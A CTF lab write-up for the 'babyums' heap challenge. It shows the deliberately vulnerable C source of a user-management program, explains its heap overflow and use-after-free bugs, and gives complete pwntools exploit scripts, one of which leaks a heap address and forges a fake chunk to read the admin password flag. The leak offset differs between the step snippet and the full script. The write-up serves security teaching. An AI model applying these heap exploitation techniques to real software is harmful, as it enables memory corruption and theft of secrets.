# Simple PWN 0x19(Lab - `babyums` - flag 1)
###### tags: `CTF` `PWN` `eductf`

Version: Ubuntu 20.04

## Original Code
:::spoiler Original Code
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define FLAG1 "flag{XXXXXXXX}"

struct User
{
    char name[0x10];
    char password[0x10];
    void *data;
};

struct User *users[8];

static short int get_idx()
{
    short int idx;

    printf("index\n> ");
    scanf("%hu", &idx);

    if (idx >= 8)
        printf("no, no ..."), exit(1);
    
    return idx;
}

static short int get_size()
{
    short int size;

    printf("size\n> ");
    scanf("%hu", &size);

    if (size >= 0x500)
        printf("no, no ..."), exit(1);
    
    return size;
}

void add_user()
{
    short int idx;

    idx = get_idx();
    users[idx] = malloc(sizeof(*users[idx]));

    printf("username\n> ");
    read(0, users[idx]->name, 0x10);

    printf("password\n> ");
    read(0, users[idx]->password, 0x10);

    users[idx]->data = NULL;
    printf("success!\n");
}

void edit_data()
{
    short int idx;
    short int size;

    idx = get_idx();
    size = get_size();

    if (users[idx]->data == NULL)
        users[idx]->data = malloc(size);
    
    read(0, users[idx]->data, size);
    printf("success!\n");
}

void del_user()
{
    short int idx;

    idx = get_idx();
    free(users[idx]->data);
    free(users[idx]);
    printf("success!\n");
}

void show_users()
{
    for (int i = 0; i < 8; i++) {
        if (users[i] == NULL || users[i]->data == NULL)
            continue;
        
        printf("[%d] %s\ndata: %s\n", i, users[i]->name, (char *)users[i]->data);
    }
}

void add_admin()
{
    users[0] = malloc(sizeof(*users[0]));
    strcpy(users[0]->name, "admin");
    strcpy(users[0]->password, FLAG1);
    users[0]->data = NULL;
}

int main()
{
    char opt[2];
    int power = 20;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("**** User Management System ****\n");
    add_admin();

    while (power)
    {
        power--;
        printf("1. add_user\n"
               "2. edit_data\n"
               "3. del_user\n"
               "4. show_users\n"
               "5. bye\n"
               "> ");
        read(0, opt, 2);

        switch (opt[0]) {
        case '1': add_user(); break;
        case '2': edit_data(); break;
        case '3': del_user(); break;
        case '4': show_users(); break;
        case '5': exit(0);
        }
    }
    printf("No... no power..., b..ye...\n");
    
    return 0;
}
```
:::
### Something wrong
* Heap overflow
* Used after free(UAF)
* Note that, flag 1 is admin password, flag 2 is at `/home/chal/`


## Exploit
### Hard solution - leak heap base address + heap overflow
If we can use heap overflow to overlap the `user k`'s `*data`, then we can let it point to admin's password and use `show_users()` to print it out
1. leak admin password address
It's very straight forward, if we delete two user, user 2 first and then user 1, at the same time, the `fd` of user 1 will point to the data of user 2. Then we can use `show_user()` to leak the address and try to find `admin_pass_addr` by minus offset
    ```python!
    edit_data(0, 0x8, b'a')    # Must add this line to use heap overflow
    add_user(1, b'a'*8, b'aaaa')
    edit_data(1, 0x20, b'a')
    add_user(2, b'b'*8, b'bbbb')
    del_user(2)
    del_user(1)
    show_user()
    r.recvuntil(b'[1] ')
    r.recvuntil(b'data: ')
    admin_pass_addr = u64(r.recv(6).ljust(8, b'\x00')) - 0xa0
    print(hex(admin_pass_addr))
    ```
    ![](https://imgur.com/ZicILFr.png)

2. Get the memory back from `tcache`
    ```python!
    add_user(1, b'a'*8, b'aaaa')
    edit_data(1, 0x20, b'a')
    ```

3. Construct fake chunk that the data pointer will point to the `admin_pass_addr`
    ```python!
    fake_chunk = flat(
        b'a'*8, b'a'*8,
        b'a'*8, 0x31,
        b'a'*8, b'a'*8,
        b'a'*8, b'a'*8,
        admin_pass_addr, 
    )
    edit_data(0, 0x48, fake_chunk)
    show_user()
    ```
    ![](https://imgur.com/N81QUXR.png)
4. Then we got flag 1!!!
    ![](https://imgur.com/HezQUdJ.png)


### Easy solution
Try to let the admin user be the data of other user, then we can use `show_user` function to print it out
```python!
add_user(1, b'a'*8, b'aaaa')
del_user(0)
edit_data(1, 0x20, b'b'*16)
show_user()
```
1. First, we add user 1
        ![](https://imgur.com/TrRwqJY.png)
2. Then we delete user 0(admin), so that it'll be put into `tcache`(`0x30`)
    ![](https://imgur.com/GlClYCU.png)
3. When we use `edit_data` function, it'll get a memory space from sub-bin of `tcache` be user1's data, which is what we delete. In addition, in order to print the data section out, must change the `NULL` byte to garbage
    ![](https://imgur.com/B4lCir7.png)
4. Then we got flag 1!!!
    ![](https://imgur.com/mUA6ubZ.png)


:::spoiler Whole exploit
```python=
from pwn import *

r = process('./chal')
# r = remote('edu-ctf.zoolab.org', 10008)

context.arch = 'amd64'

def add_user(idx, user_name, user_passwd):
    r.sendafter(b'> ', b'1')
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendafter(b'username\n> ', user_name)
    r.sendafter(b'password\n> ', user_passwd)

def edit_data(idx, note_size, message):
    r.sendafter(b"> ", b"2")
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendlineafter(b'size\n> ', str(note_size))
    r.send(message)

def del_user(idx):
    r.sendafter(b"> ", b"3")
    r.sendlineafter(b'index\n> ', str(idx))

def show_user():
    r.sendafter(b"> ", b"4")


'''------------------
Hard solution
------------------'''
edit_data(0, 0x8, b'a')
add_user(1, b'a'*8, b'aaaa')
edit_data(1, 0x20, b'a')
add_user(2, b'b'*8, b'bbbb')
del_user(2)
del_user(1)
show_user()
r.recvuntil(b'[1] ')

admin_pass_addr = u64(r.recv(6).ljust(8, b'\x00')) - 0x70
print(hex(admin_pass_addr))
add_user(1, b'a'*8, b'aaaa')
fake_chunk = flat(
    b'a'*8, b'a'*8,
    b'a'*8, 0x31,
    b'a'*8, b'a'*8,
    b'a'*8, b'a'*8,
    admin_pass_addr, 
)

edit_data(1, 0x20, b'a')
edit_data(0, 0x48, fake_chunk)
show_user()

'''------------------
Easy solution
------------------'''
add_user(1, b'a'*8, b'aaaa')
del_user(0)
edit_data(1, 0x20, b'b'*16)
show_user()

r.interactive()
```
:::